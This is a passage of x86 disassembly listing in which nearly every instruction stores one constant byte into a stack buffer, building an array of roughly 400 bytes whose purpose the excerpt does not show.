  401882:	c6 85 50 fe ff ff cd 	mov    BYTE PTR [ebp-0x1b0],0xcd
  401889:	c6 85 51 fe ff ff bd 	mov    BYTE PTR [ebp-0x1af],0xbd
  401890:	c6 85 52 fe ff ff 86 	mov    BYTE PTR [ebp-0x1ae],0x86
  401897:	c6 85 53 fe ff ff aa 	mov    BYTE PTR [ebp-0x1ad],0xaa
  40189e:	c6 85 54 fe ff ff 8c 	mov    BYTE PTR [ebp-0x1ac],0x8c
  4018a5:	c6 85 55 fe ff ff 55 	mov    BYTE PTR [ebp-0x1ab],0x55
  4018ac:	c6 85 56 fe ff ff 49 	mov    BYTE PTR [ebp-0x1aa],0x49
  4018b3:	c6 85 57 fe ff ff fb 	mov    BYTE PTR [ebp-0x1a9],0xfb
  4018ba:	c6 85 58 fe ff ff c3 	mov    BYTE PTR [ebp-0x1a8],0xc3
  4018c1:	c6 85 59 fe ff ff fb 	mov    BYTE PTR [ebp-0x1a7],0xfb
  4018c8:	c6 85 5a fe ff ff e7 	mov    BYTE PTR [ebp-0x1a6],0xe7
  4018cf:	c6 85 5b fe ff ff 86 	mov    BYTE PTR [ebp-0x1a5],0x86
  4018d6:	c6 85 5c fe ff ff 5b 	mov    BYTE PTR [ebp-0x1a4],0x5b
  4018dd:	c6 85 5d fe ff ff 75 	mov    BYTE PTR [ebp-0x1a3],0x75
  4018e4:	c6 85 5e fe ff ff 8c 	mov    BYTE PTR [ebp-0x1a2],0x8c
  4018eb:	c6 85 5f fe ff ff 0b 	mov    BYTE PTR [ebp-0x1a1],0xb
  4018f2:	c6 85 60 fe ff ff 28 	mov    BYTE PTR [ebp-0x1a0],0x28
  4018f9:	c6 85 61 fe ff ff f1 	mov    BYTE PTR [ebp-0x19f],0xf1
  401900:	c6 85 62 fe ff ff 35 	mov    BYTE PTR [ebp-0x19e],0x35
  401907:	c6 85 63 fe ff ff 0d 	mov    BYTE PTR [ebp-0x19d],0xd
  40190e:	c6 85 64 fe ff ff 2b 	mov    BYTE PTR [ebp-0x19c],0x2b
  401915:	c6 85 65 fe ff ff e7 	mov    BYTE PTR [ebp-0x19b],0xe7
  40191c:	c6 85 66 fe ff ff 05 	mov    BYTE PTR [ebp-0x19a],0x5
  401923:	c6 85 67 fe ff ff e6 	mov    BYTE PTR [ebp-0x199],0xe6
  40192a:	c6 85 68 fe ff ff 3d 	mov    BYTE PTR [ebp-0x198],0x3d
  401931:	c6 85 69 fe ff ff ca 	mov    BYTE PTR [ebp-0x197],0xca
  401938:	c6 85 6a fe ff ff 6d 	mov    BYTE PTR [ebp-0x196],0x6d
  40193f:	c6 85 6b fe ff ff ff 	mov    BYTE PTR [ebp-0x195],0xff
  401946:	c6 85 6c fe ff ff a9 	mov    BYTE PTR [ebp-0x194],0xa9
  40194d:	c6 85 6d fe ff ff ed 	mov    BYTE PTR [ebp-0x193],0xed
  401954:	c6 85 6e fe ff ff 6e 	mov    BYTE PTR [ebp-0x192],0x6e
  40195b:	c6 85 6f fe ff ff d2 	mov    BYTE PTR [ebp-0x191],0xd2
  401962:	c6 85 70 fe ff ff 99 	mov    BYTE PTR [ebp-0x190],0x99
  401969:	c6 85 71 fe ff ff 38 	mov    BYTE PTR [ebp-0x18f],0x38
  401970:	c6 85 72 fe ff ff e2 	mov    BYTE PTR [ebp-0x18e],0xe2
  401977:	c6 85 73 fe ff ff c6 	mov    BYTE PTR [ebp-0x18d],0xc6
  40197e:	c6 85 74 fe ff ff f7 	mov    BYTE PTR [ebp-0x18c],0xf7
  401985:	c6 85 75 fe ff ff 95 	mov    BYTE PTR [ebp-0x18b],0x95
  40198c:	c6 85 76 fe ff ff 6a 	mov    BYTE PTR [ebp-0x18a],0x6a
  401993:	c6 85 77 fe ff ff f4 	mov    BYTE PTR [ebp-0x189],0xf4
  40199a:	c6 85 78 fe ff ff db 	mov    BYTE PTR [ebp-0x188],0xdb
  4019a1:	c6 85 79 fe ff ff 49 	mov    BYTE PTR [ebp-0x187],0x49
  4019a8:	c6 85 7a fe ff ff 27 	mov    BYTE PTR [ebp-0x186],0x27
  4019af:	c6 85 7b fe ff ff 4e 	mov    BYTE PTR [ebp-0x185],0x4e
  4019b6:	c6 85 7c fe ff ff ad 	mov    BYTE PTR [ebp-0x184],0xad
  4019bd:	c6 85 7d fe ff ff c1 	mov    BYTE PTR [ebp-0x183],0xc1
  4019c4:	c6 85 7e fe ff ff c2 	mov    BYTE PTR [ebp-0x182],0xc2
  4019cb:	c6 85 7f fe ff ff 41 	mov    BYTE PTR [ebp-0x181],0x41
  4019d2:	c6 85 80 fe ff ff 22 	mov    BYTE PTR [ebp-0x180],0x22
  4019d9:	c6 85 81 fe ff ff 02 	mov    BYTE PTR [ebp-0x17f],0x2
  4019e0:	c6 85 82 fe ff ff c1 	mov    BYTE PTR [ebp-0x17e],0xc1
  4019e7:	c6 85 83 fe ff ff d8 	mov    BYTE PTR [ebp-0x17d],0xd8
  4019ee:	c6 85 84 fe ff ff a3 	mov    BYTE PTR [ebp-0x17c],0xa3
  4019f5:	c6 85 85 fe ff ff 16 	mov    BYTE PTR [ebp-0x17b],0x16
  4019fc:	c6 85 86 fe ff ff 59 	mov    BYTE PTR [ebp-0x17a],0x59
  401a03:	c6 85 87 fe ff ff 50 	mov    BYTE PTR [ebp-0x179],0x50
  401a0a:	c6 85 88 fe ff ff f3 	mov    BYTE PTR [ebp-0x178],0xf3
  401a11:	c6 85 89 fe ff ff ae 	mov    BYTE PTR [ebp-0x177],0xae
  401a18:	c6 85 8a fe ff ff f9 	mov    BYTE PTR [ebp-0x176],0xf9
  401a1f:	c6 85 8b fe ff ff b6 	mov    BYTE PTR [ebp-0x175],0xb6
  401a26:	c6 85 8c fe ff ff 28 	mov    BYTE PTR [ebp-0x174],0x28
  401a2d:	c6 85 8d fe ff ff b4 	mov    BYTE PTR [ebp-0x173],0xb4
  401a34:	c6 85 8e fe ff ff b2 	mov    BYTE PTR [ebp-0x172],0xb2
  401a3b:	c6 85 8f fe ff ff 3b 	mov    BYTE PTR [ebp-0x171],0x3b
  401a42:	c6 85 90 fe ff ff 02 	mov    BYTE PTR [ebp-0x170],0x2
  401a49:	c6 85 91 fe ff ff 96 	mov    BYTE PTR [ebp-0x16f],0x96
  401a50:	c6 85 92 fe ff ff 10 	mov    BYTE PTR [ebp-0x16e],0x10
  401a57:	c6 85 93 fe ff ff 0b 	mov    BYTE PTR [ebp-0x16d],0xb
  401a5e:	c6 85 94 fe ff ff 5c 	mov    BYTE PTR [ebp-0x16c],0x5c
  401a65:	c6 85 95 fe ff ff 3e 	mov    BYTE PTR [ebp-0x16b],0x3e
  401a6c:	c6 85 96 fe ff ff 3c 	mov    BYTE PTR [ebp-0x16a],0x3c
  401a73:	c6 85 97 fe ff ff 90 	mov    BYTE PTR [ebp-0x169],0x90
  401a7a:	c6 85 98 fe ff ff b6 	mov    BYTE PTR [ebp-0x168],0xb6
  401a81:	c6 85 99 fe ff ff b1 	mov    BYTE PTR [ebp-0x167],0xb1
  401a88:	c6 85 9a fe ff ff 39 	mov    BYTE PTR [ebp-0x166],0x39
  401a8f:	c6 85 9b fe ff ff e3 	mov    BYTE PTR [ebp-0x165],0xe3
  401a96:	c6 85 9c fe ff ff 6c 	mov    BYTE PTR [ebp-0x164],0x6c
  401a9d:	c6 85 9d fe ff ff 92 	mov    BYTE PTR [ebp-0x163],0x92
  401aa4:	c6 85 9e fe ff ff 0c 	mov    BYTE PTR [ebp-0x162],0xc
  401aab:	c6 85 9f fe ff ff 49 	mov    BYTE PTR [ebp-0x161],0x49
  401ab2:	c6 85 a0 fe ff ff 46 	mov    BYTE PTR [ebp-0x160],0x46
  401ab9:	c6 85 a1 fe ff ff 23 	mov    BYTE PTR [ebp-0x15f],0x23
  401ac0:	c6 85 a2 fe ff ff f1 	mov    BYTE PTR [ebp-0x15e],0xf1
  401ac7:	c6 85 a3 fe ff ff 34 	mov    BYTE PTR [ebp-0x15d],0x34
  401ace:	c6 85 a4 fe ff ff f8 	mov    BYTE PTR [ebp-0x15c],0xf8
  401ad5:	c6 85 a5 fe ff ff a1 	mov    BYTE PTR [ebp-0x15b],0xa1
  401adc:	c6 85 a6 fe ff ff 12 	mov    BYTE PTR [ebp-0x15a],0x12
  401ae3:	c6 85 a7 fe ff ff 43 	mov    BYTE PTR [ebp-0x159],0x43
  401aea:	c6 85 a8 fe ff ff 11 	mov    BYTE PTR [ebp-0x158],0x11
  401af1:	c6 85 a9 fe ff ff e1 	mov    BYTE PTR [ebp-0x157],0xe1
  401af8:	c6 85 aa fe ff ff 69 	mov    BYTE PTR [ebp-0x156],0x69
  401aff:	c6 85 ab fe ff ff 78 	mov    BYTE PTR [ebp-0x155],0x78
  401b06:	c6 85 ac fe ff ff 86 	mov    BYTE PTR [ebp-0x154],0x86
  401b0d:	c6 85 ad fe ff ff 3f 	mov    BYTE PTR [ebp-0x153],0x3f
  401b14:	c6 85 ae fe ff ff 9c 	mov    BYTE PTR [ebp-0x152],0x9c
  401b1b:	c6 85 af fe ff ff 89 	mov    BYTE PTR [ebp-0x151],0x89
  401b22:	c6 85 b0 fe ff ff 07 	mov    BYTE PTR [ebp-0x150],0x7
  401b29:	c6 85 b1 fe ff ff 6c 	mov    BYTE PTR [ebp-0x14f],0x6c
  401b30:	c6 85 b2 fe ff ff 87 	mov    BYTE PTR [ebp-0x14e],0x87
  401b37:	c6 85 b3 fe ff ff 6d 	mov    BYTE PTR [ebp-0x14d],0x6d
  401b3e:	c6 85 b4 fe ff ff 30 	mov    BYTE PTR [ebp-0x14c],0x30
  401b45:	c6 85 b5 fe ff ff 52 	mov    BYTE PTR [ebp-0x14b],0x52
  401b4c:	c6 85 b6 fe ff ff 6b 	mov    BYTE PTR [ebp-0x14a],0x6b
  401b53:	c6 85 b7 fe ff ff 8b 	mov    BYTE PTR [ebp-0x149],0x8b
  401b5a:	c6 85 b8 fe ff ff c9 	mov    BYTE PTR [ebp-0x148],0xc9
  401b61:	c6 85 b9 fe ff ff 9a 	mov    BYTE PTR [ebp-0x147],0x9a
  401b68:	c6 85 ba fe ff ff 4e 	mov    BYTE PTR [ebp-0x146],0x4e
  401b6f:	c6 85 bb fe ff ff 57 	mov    BYTE PTR [ebp-0x145],0x57
  401b76:	c6 85 bc fe ff ff 35 	mov    BYTE PTR [ebp-0x144],0x35
  401b7d:	c6 85 bd fe ff ff a8 	mov    BYTE PTR [ebp-0x143],0xa8
  401b84:	c6 85 be fe ff ff 90 	mov    BYTE PTR [ebp-0x142],0x90
  401b8b:	c6 85 bf fe ff ff 7c 	mov    BYTE PTR [ebp-0x141],0x7c
  401b92:	c6 85 c0 fe ff ff 57 	mov    BYTE PTR [ebp-0x140],0x57
  401b99:	c6 85 c1 fe ff ff 2c 	mov    BYTE PTR [ebp-0x13f],0x2c
  401ba0:	c6 85 c2 fe ff ff 17 	mov    BYTE PTR [ebp-0x13e],0x17
  401ba7:	c6 85 c3 fe ff ff 84 	mov    BYTE PTR [ebp-0x13d],0x84
  401bae:	c6 85 c4 fe ff ff 01 	mov    BYTE PTR [ebp-0x13c],0x1
  401bb5:	c6 85 c5 fe ff ff e8 	mov    BYTE PTR [ebp-0x13b],0xe8
  401bbc:	c6 85 c6 fe ff ff f5 	mov    BYTE PTR [ebp-0x13a],0xf5
  401bc3:	c6 85 c7 fe ff ff e0 	mov    BYTE PTR [ebp-0x139],0xe0
  401bca:	c6 85 c8 fe ff ff b4 	mov    BYTE PTR [ebp-0x138],0xb4
  401bd1:	c6 85 c9 fe ff ff fc 	mov    BYTE PTR [ebp-0x137],0xfc
  401bd8:	c6 85 ca fe ff ff 70 	mov    BYTE PTR [ebp-0x136],0x70
  401bdf:	c6 85 cb fe ff ff 4a 	mov    BYTE PTR [ebp-0x135],0x4a
  401be6:	c6 85 cc fe ff ff b4 	mov    BYTE PTR [ebp-0x134],0xb4
  401bed:	c6 85 cd fe ff ff cc 	mov    BYTE PTR [ebp-0x133],0xcc
  401bf4:	c6 85 ce fe ff ff f4 	mov    BYTE PTR [ebp-0x132],0xf4
  401bfb:	c6 85 cf fe ff ff 9c 	mov    BYTE PTR [ebp-0x131],0x9c
  401c02:	c6 85 d0 fe ff ff 59 	mov    BYTE PTR [ebp-0x130],0x59
  401c09:	c6 85 d1 fe ff ff 1f 	mov    BYTE PTR [ebp-0x12f],0x1f
  401c10:	c6 85 d2 fe ff ff 8a 	mov    BYTE PTR [ebp-0x12e],0x8a
  401c17:	c6 85 d3 fe ff ff a3 	mov    BYTE PTR [ebp-0x12d],0xa3
  401c1e:	c6 85 d4 fe ff ff 64 	mov    BYTE PTR [ebp-0x12c],0x64
  401c25:	c6 85 d5 fe ff ff ce 	mov    BYTE PTR [ebp-0x12b],0xce
  401c2c:	c6 85 d6 fe ff ff 99 	mov    BYTE PTR [ebp-0x12a],0x99
  401c33:	c6 85 d7 fe ff ff 96 	mov    BYTE PTR [ebp-0x129],0x96
  401c3a:	c6 85 d8 fe ff ff f5 	mov    BYTE PTR [ebp-0x128],0xf5
  401c41:	c6 85 d9 fe ff ff f5 	mov    BYTE PTR [ebp-0x127],0xf5
  401c48:	c6 85 da fe ff ff a6 	mov    BYTE PTR [ebp-0x126],0xa6
  401c4f:	c6 85 db fe ff ff 6d 	mov    BYTE PTR [ebp-0x125],0x6d
  401c56:	c6 85 dc fe ff ff e1 	mov    BYTE PTR [ebp-0x124],0xe1
  401c5d:	c6 85 dd fe ff ff c9 	mov    BYTE PTR [ebp-0x123],0xc9
  401c64:	c6 85 de fe ff ff f9 	mov    BYTE PTR [ebp-0x122],0xf9
  401c6b:	c6 85 df fe ff ff 74 	mov    BYTE PTR [ebp-0x121],0x74
  401c72:	c6 85 e0 fe ff ff 8c 	mov    BYTE PTR [ebp-0x120],0x8c
  401c79:	c6 85 e1 fe ff ff 88 	mov    BYTE PTR [ebp-0x11f],0x88
  401c80:	c6 85 e2 fe ff ff b4 	mov    BYTE PTR [ebp-0x11e],0xb4
  401c87:	c6 85 e3 fe ff ff 59 	mov    BYTE PTR [ebp-0x11d],0x59
  401c8e:	c6 85 e4 fe ff ff 3d 	mov    BYTE PTR [ebp-0x11c],0x3d
  401c95:	c6 85 e5 fe ff ff 28 	mov    BYTE PTR [ebp-0x11b],0x28
  401c9c:	c6 85 e6 fe ff ff 95 	mov    BYTE PTR [ebp-0x11a],0x95
  401ca3:	c6 85 e7 fe ff ff d1 	mov    BYTE PTR [ebp-0x119],0xd1
  401caa:	c6 85 e8 fe ff ff 90 	mov    BYTE PTR [ebp-0x118],0x90
  401cb1:	c6 85 e9 fe ff ff ce 	mov    BYTE PTR [ebp-0x117],0xce
  401cb8:	c6 85 ea fe ff ff 1d 	mov    BYTE PTR [ebp-0x116],0x1d
  401cbf:	c6 85 eb fe ff ff 05 	mov    BYTE PTR [ebp-0x115],0x5
  401cc6:	c6 85 ec fe ff ff 1d 	mov    BYTE PTR [ebp-0x114],0x1d
  401ccd:	c6 85 ed fe ff ff 5a 	mov    BYTE PTR [ebp-0x113],0x5a
  401cd4:	c6 85 ee fe ff ff 99 	mov    BYTE PTR [ebp-0x112],0x99
  401cdb:	c6 85 ef fe ff ff 62 	mov    BYTE PTR [ebp-0x111],0x62
  401ce2:	c6 85 f0 fe ff ff a3 	mov    BYTE PTR [ebp-0x110],0xa3
  401ce9:	c6 85 f1 fe ff ff 81 	mov    BYTE PTR [ebp-0x10f],0x81
  401cf0:	c6 85 f2 fe ff ff 3d 	mov    BYTE PTR [ebp-0x10e],0x3d
  401cf7:	c6 85 f3 fe ff ff f3 	mov    BYTE PTR [ebp-0x10d],0xf3
  401cfe:	c6 85 f4 fe ff ff 92 	mov    BYTE PTR [ebp-0x10c],0x92
  401d05:	c6 85 f5 fe ff ff f3 	mov    BYTE PTR [ebp-0x10b],0xf3
  401d0c:	c6 85 f6 fe ff ff e6 	mov    BYTE PTR [ebp-0x10a],0xe6
  401d13:	c6 85 f7 fe ff ff 33 	mov    BYTE PTR [ebp-0x109],0x33
  401d1a:	c6 85 f8 fe ff ff e5 	mov    BYTE PTR [ebp-0x108],0xe5
  401d21:	c6 85 f9 fe ff ff e9 	mov    BYTE PTR [ebp-0x107],0xe9
  401d28:	c6 85 fa fe ff ff 3f 	mov    BYTE PTR [ebp-0x106],0x3f
  401d2f:	c6 85 fb fe ff ff 4e 	mov    BYTE PTR [ebp-0x105],0x4e
  401d36:	c6 85 fc fe ff ff 76 	mov    BYTE PTR [ebp-0x104],0x76
  401d3d:	c6 85 fd fe ff ff 7f 	mov    BYTE PTR [ebp-0x103],0x7f
  401d44:	c6 85 fe fe ff ff e1 	mov    BYTE PTR [ebp-0x102],0xe1
  401d4b:	c6 85 ff fe ff ff dc 	mov    BYTE PTR [ebp-0x101],0xdc
  401d52:	c6 85 00 ff ff ff 68 	mov    BYTE PTR [ebp-0x100],0x68
  401d59:	c6 85 01 ff ff ff 65 	mov    BYTE PTR [ebp-0xff],0x65
  401d60:	c6 85 02 ff ff ff c8 	mov    BYTE PTR [ebp-0xfe],0xc8
  401d67:	c6 85 03 ff ff ff 8a 	mov    BYTE PTR [ebp-0xfd],0x8a
  401d6e:	c6 85 04 ff ff ff 55 	mov    BYTE PTR [ebp-0xfc],0x55
  401d75:	c6 85 05 ff ff ff 85 	mov    BYTE PTR [ebp-0xfb],0x85
  401d7c:	c6 85 06 ff ff ff 34 	mov    BYTE PTR [ebp-0xfa],0x34
  401d83:	c6 85 07 ff ff ff 36 	mov    BYTE PTR [ebp-0xf9],0x36
  401d8a:	c6 85 08 ff ff ff 66 	mov    BYTE PTR [ebp-0xf8],0x66
  401d91:	c6 85 09 ff ff ff 35 	mov    BYTE PTR [ebp-0xf7],0x35
  401d98:	c6 85 0a ff ff ff 9e 	mov    BYTE PTR [ebp-0xf6],0x9e
  401d9f:	c6 85 0b ff ff ff 70 	mov    BYTE PTR [ebp-0xf5],0x70
  401da6:	c6 85 0c ff ff ff 7c 	mov    BYTE PTR [ebp-0xf4],0x7c
  401dad:	c6 85 0d ff ff ff 76 	mov    BYTE PTR [ebp-0xf3],0x76
  401db4:	c6 85 0e ff ff ff 99 	mov    BYTE PTR [ebp-0xf2],0x99
  401dbb:	c6 85 0f ff ff ff 62 	mov    BYTE PTR [ebp-0xf1],0x62
  401dc2:	c6 85 10 ff ff ff 85 	mov    BYTE PTR [ebp-0xf0],0x85
  401dc9:	c6 85 11 ff ff ff 87 	mov    BYTE PTR [ebp-0xef],0x87
  401dd0:	c6 85 12 ff ff ff a7 	mov    BYTE PTR [ebp-0xee],0xa7
  401dd7:	c6 85 13 ff ff ff 4c 	mov    BYTE PTR [ebp-0xed],0x4c
  401dde:	c6 85 14 ff ff ff 96 	mov    BYTE PTR [ebp-0xec],0x96
  401de5:	c6 85 15 ff ff ff 72 	mov    BYTE PTR [ebp-0xeb],0x72
  401dec:	c6 85 16 ff ff ff 60 	mov    BYTE PTR [ebp-0xea],0x60
  401df3:	c6 85 17 ff ff ff 5c 	mov    BYTE PTR [ebp-0xe9],0x5c
  401dfa:	c6 85 18 ff ff ff c9 	mov    BYTE PTR [ebp-0xe8],0xc9
  401e01:	c6 85 19 ff ff ff f1 	mov    BYTE PTR [ebp-0xe7],0xf1
  401e08:	c6 85 1a ff ff ff 24 	mov    BYTE PTR [ebp-0xe6],0x24
  401e0f:	c6 85 1b ff ff ff e8 	mov    BYTE PTR [ebp-0xe5],0xe8
  401e16:	c6 85 1c ff ff ff 76 	mov    BYTE PTR [ebp-0xe4],0x76
  401e1d:	c6 85 1d ff ff ff 1c 	mov    BYTE PTR [ebp-0xe3],0x1c
  401e24:	c6 85 1e ff ff ff 4b 	mov    BYTE PTR [ebp-0xe2],0x4b
  401e2b:	c6 85 1f ff ff ff 44 	mov    BYTE PTR [ebp-0xe1],0x44
  401e32:	c6 85 20 ff ff ff d3 	mov    BYTE PTR [ebp-0xe0],0xd3
  401e39:	c6 85 21 ff ff ff a4 	mov    BYTE PTR [ebp-0xdf],0xa4
  401e40:	c6 85 22 ff ff ff 4d 	mov    BYTE PTR [ebp-0xde],0x4d
  401e47:	c6 85 23 ff ff ff 75 	mov    BYTE PTR [ebp-0xdd],0x75
  401e4e:	c6 85 24 ff ff ff af 	mov    BYTE PTR [ebp-0xdc],0xaf
  401e55:	c6 85 25 ff ff ff 48 	mov    BYTE PTR [ebp-0xdb],0x48
  401e5c:	c6 85 26 ff ff ff e8 	mov    BYTE PTR [ebp-0xda],0xe8
  401e63:	c6 85 27 ff ff ff f3 	mov    BYTE PTR [ebp-0xd9],0xf3
  401e6a:	c6 85 28 ff ff ff 96 	mov    BYTE PTR [ebp-0xd8],0x96
  401e71:	c6 85 29 ff ff ff 45 	mov    BYTE PTR [ebp-0xd7],0x45
  401e78:	c6 85 2a ff ff ff 45 	mov    BYTE PTR [ebp-0xd6],0x45
  401e7f:	c6 85 2b ff ff ff 55 	mov    BYTE PTR [ebp-0xd5],0x55
  401e86:	c6 85 2c ff ff ff 61 	mov    BYTE PTR [ebp-0xd4],0x61
  401e8d:	c6 85 2d ff ff ff 12 	mov    BYTE PTR [ebp-0xd3],0x12
  401e94:	c6 85 2e ff ff ff ca 	mov    BYTE PTR [ebp-0xd2],0xca
  401e9b:	c6 85 2f ff ff ff 7c 	mov    BYTE PTR [ebp-0xd1],0x7c
  401ea2:	c6 85 30 ff ff ff 7a 	mov    BYTE PTR [ebp-0xd0],0x7a
  401ea9:	c6 85 31 ff ff ff e3 	mov    BYTE PTR [ebp-0xcf],0xe3
  401eb0:	c6 85 32 ff ff ff dc 	mov    BYTE PTR [ebp-0xce],0xdc
  401eb7:	c6 85 33 ff ff ff fb 	mov    BYTE PTR [ebp-0xcd],0xfb
  401ebe:	c6 85 34 ff ff ff 31 	mov    BYTE PTR [ebp-0xcc],0x31
  401ec5:	c6 85 35 ff ff ff d5 	mov    BYTE PTR [ebp-0xcb],0xd5
  401ecc:	c6 85 36 ff ff ff 34 	mov    BYTE PTR [ebp-0xca],0x34
  401ed3:	c6 85 37 ff ff ff 50 	mov    BYTE PTR [ebp-0xc9],0x50
  401eda:	c6 85 38 ff ff ff b5 	mov    BYTE PTR [ebp-0xc8],0xb5
  401ee1:	c6 85 39 ff ff ff 45 	mov    BYTE PTR [ebp-0xc7],0x45
  401ee8:	c6 85 3a ff ff ff 9a 	mov    BYTE PTR [ebp-0xc6],0x9a
  401eef:	c6 85 3b ff ff ff ea 	mov    BYTE PTR [ebp-0xc5],0xea
  401ef6:	c6 85 3c ff ff ff b5 	mov    BYTE PTR [ebp-0xc4],0xb5
  401efd:	c6 85 3d ff ff ff 8b 	mov    BYTE PTR [ebp-0xc3],0x8b
  401f04:	c6 85 3e ff ff ff 9f 	mov    BYTE PTR [ebp-0xc2],0x9f
  401f0b:	c6 85 3f ff ff ff a8 	mov    BYTE PTR [ebp-0xc1],0xa8
  401f12:	c6 85 40 ff ff ff ff 	mov    BYTE PTR [ebp-0xc0],0xff
  401f19:	c6 85 41 ff ff ff fb 	mov    BYTE PTR [ebp-0xbf],0xfb
  401f20:	c6 85 42 ff ff ff e0 	mov    BYTE PTR [ebp-0xbe],0xe0
  401f27:	c6 85 43 ff ff ff 40 	mov    BYTE PTR [ebp-0xbd],0x40
  401f2e:	88 8d 44 ff ff ff    	mov    BYTE PTR [ebp-0xbc],cl
  401f34:	88 8d 45 ff ff ff    	mov    BYTE PTR [ebp-0xbb],cl
  401f3a:	c6 85 46 ff ff ff 0d 	mov    BYTE PTR [ebp-0xba],0xd
  401f41:	c6 85 47 ff ff ff 22 	mov    BYTE PTR [ebp-0xb9],0x22
  401f48:	c6 85 48 ff ff ff 5d 	mov    BYTE PTR [ebp-0xb8],0x5d
  401f4f:	c6 85 49 ff ff ff d8 	mov    BYTE PTR [ebp-0xb7],0xd8
  401f56:	c6 85 4a ff ff ff 4b 	mov    BYTE PTR [ebp-0xb6],0x4b
  401f5d:	c6 85 4b ff ff ff 29 	mov    BYTE PTR [ebp-0xb5],0x29
  401f64:	c6 85 4c ff ff ff 63 	mov    BYTE PTR [ebp-0xb4],0x63
  401f6b:	c6 85 4d ff ff ff 6a 	mov    BYTE PTR [ebp-0xb3],0x6a
  401f72:	c6 85 4e ff ff ff ba 	mov    BYTE PTR [ebp-0xb2],0xba
  401f79:	c6 85 4f ff ff ff 0c 	mov    BYTE PTR [ebp-0xb1],0xc
  401f80:	c6 85 50 ff ff ff fb 	mov    BYTE PTR [ebp-0xb0],0xfb
  401f87:	c6 85 51 ff ff ff 2d 	mov    BYTE PTR [ebp-0xaf],0x2d
  401f8e:	c6 85 52 ff ff ff 65 	mov    BYTE PTR [ebp-0xae],0x65
  401f95:	c6 85 53 ff ff ff 2c 	mov    BYTE PTR [ebp-0xad],0x2c
  401f9c:	c6 85 54 ff ff ff 6d 	mov    BYTE PTR [ebp-0xac],0x6d
  401fa3:	c6 85 55 ff ff ff 58 	mov    BYTE PTR [ebp-0xab],0x58
  401faa:	c6 85 56 ff ff ff 7d 	mov    BYTE PTR [ebp-0xaa],0x7d
  401fb1:	c6 85 57 ff ff ff a3 	mov    BYTE PTR [ebp-0xa9],0xa3
  401fb8:	c6 85 58 ff ff ff 5f 	mov    BYTE PTR [ebp-0xa8],0x5f
  401fbf:	c6 85 59 ff ff ff 4c 	mov    BYTE PTR [ebp-0xa7],0x4c
  401fc6:	c6 85 5a ff ff ff a5 	mov    BYTE PTR [ebp-0xa6],0xa5
  401fcd:	c6 85 5b ff ff ff 8d 	mov    BYTE PTR [ebp-0xa5],0x8d
  401fd4:	c6 85 5c ff ff ff a3 	mov    BYTE PTR [ebp-0xa4],0xa3
  401fdb:	c6 85 5d ff ff ff 36 	mov    BYTE PTR [ebp-0xa3],0x36
  401fe2:	c6 85 5e ff ff ff 33 	mov    BYTE PTR [ebp-0xa2],0x33
  401fe9:	c6 85 5f ff ff ff ab 	mov    BYTE PTR [ebp-0xa1],0xab
  401ff0:	c6 85 60 ff ff ff a9 	mov    BYTE PTR [ebp-0xa0],0xa9
  401ff7:	c6 85 61 ff ff ff a6 	mov    BYTE PTR [ebp-0x9f],0xa6
  401ffe:	c6 85 62 ff ff ff 3d 	mov    BYTE PTR [ebp-0x9e],0x3d
  402005:	c6 85 63 ff ff ff b5 	mov    BYTE PTR [ebp-0x9d],0xb5
  40200c:	c6 85 64 ff ff ff 94 	mov    BYTE PTR [ebp-0x9c],0x94
  402013:	c6 85 65 ff ff ff 19 	mov    BYTE PTR [ebp-0x9b],0x19
  40201a:	c6 85 66 ff ff ff 69 	mov    BYTE PTR [ebp-0x9a],0x69
  402021:	c6 85 67 ff ff ff 6a 	mov    BYTE PTR [ebp-0x99],0x6a
  402028:	c6 85 68 ff ff ff 96 	mov    BYTE PTR [ebp-0x98],0x96
  40202f:	c6 85 69 ff ff ff d0 	mov    BYTE PTR [ebp-0x97],0xd0
  402036:	c6 85 6a ff ff ff 16 	mov    BYTE PTR [ebp-0x96],0x16
  40203d:	c6 85 6b ff ff ff 0c 	mov    BYTE PTR [ebp-0x95],0xc
  402044:	c6 85 6c ff ff ff 81 	mov    BYTE PTR [ebp-0x94],0x81
  40204b:	c6 85 6d ff ff ff 3a 	mov    BYTE PTR [ebp-0x93],0x3a
  402052:	c6 85 6e ff ff ff 0b 	mov    BYTE PTR [ebp-0x92],0xb
  402059:	c6 85 6f ff ff ff a2 	mov    BYTE PTR [ebp-0x91],0xa2
  402060:	c6 85 70 ff ff ff 44 	mov    BYTE PTR [ebp-0x90],0x44
  402067:	c6 85 71 ff ff ff d3 	mov    BYTE PTR [ebp-0x8f],0xd3
  40206e:	c6 85 72 ff ff ff 85 	mov    BYTE PTR [ebp-0x8e],0x85
  402075:	c6 85 73 ff ff ff 1b 	mov    BYTE PTR [ebp-0x8d],0x1b
  40207c:	c6 85 74 ff ff ff 7e 	mov    BYTE PTR [ebp-0x8c],0x7e
  402083:	c6 85 75 ff ff ff 23 	mov    BYTE PTR [ebp-0x8b],0x23
  40208a:	c6 85 76 ff ff ff 57 	mov    BYTE PTR [ebp-0x8a],0x57
  402091:	c6 85 77 ff ff ff e2 	mov    BYTE PTR [ebp-0x89],0xe2
  402098:	c6 85 78 ff ff ff 8e 	mov    BYTE PTR [ebp-0x88],0x8e
  40209f:	c6 85 79 ff ff ff ad 	mov    BYTE PTR [ebp-0x87],0xad
  4020a6:	c6 85 7a ff ff ff a8 	mov    BYTE PTR [ebp-0x86],0xa8
  4020ad:	c6 85 7b ff ff ff c4 	mov    BYTE PTR [ebp-0x85],0xc4
  4020b4:	c6 85 7c ff ff ff 67 	mov    BYTE PTR [ebp-0x84],0x67
  4020bb:	c6 85 7d ff ff ff 55 	mov    BYTE PTR [ebp-0x83],0x55
  4020c2:	c6 85 7e ff ff ff 10 	mov    BYTE PTR [ebp-0x82],0x10
  4020c9:	c6 85 7f ff ff ff d0 	mov    BYTE PTR [ebp-0x81],0xd0
  4020d0:	c6 45 80 34          	mov    BYTE PTR [ebp-0x80],0x34
  4020d4:	c6 45 81 87          	mov    BYTE PTR [ebp-0x7f],0x87
  4020d8:	c6 45 82 43          	mov    BYTE PTR [ebp-0x7e],0x43
  4020dc:	c6 45 83 a8          	mov    BYTE PTR [ebp-0x7d],0xa8
  4020e0:	c6 45 84 8e          	mov    BYTE PTR [ebp-0x7c],0x8e
  4020e4:	c6 45 85 16          	mov    BYTE PTR [ebp-0x7b],0x16
  4020e8:	c6 45 86 87          	mov    BYTE PTR [ebp-0x7a],0x87
  4020ec:	c6 45 87 40          	mov    BYTE PTR [ebp-0x79],0x40
  4020f0:	c6 45 88 75          	mov    BYTE PTR [ebp-0x78],0x75
  4020f4:	c6 45 89 40          	mov    BYTE PTR [ebp-0x77],0x40
